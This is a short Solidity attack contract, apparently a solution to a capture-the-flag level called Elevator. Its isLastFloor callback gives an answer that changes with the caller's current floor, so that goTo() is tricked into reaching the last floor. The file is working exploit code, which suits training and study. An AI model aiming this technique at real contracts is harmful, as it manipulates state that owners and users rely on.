pragma solidity ^0.5.0;

import '../levels/Elevator.sol';

contract ElevatorAttack {
  function isLastFloor(uint floor) public view returns (bool) {
    return floor == Elevator(msg.sender).floor();
  }

  function attack(address _victim) public {
    Elevator elevator = Elevator(_victim);
    elevator.goTo(elevator.floor() + 1);
  }
}
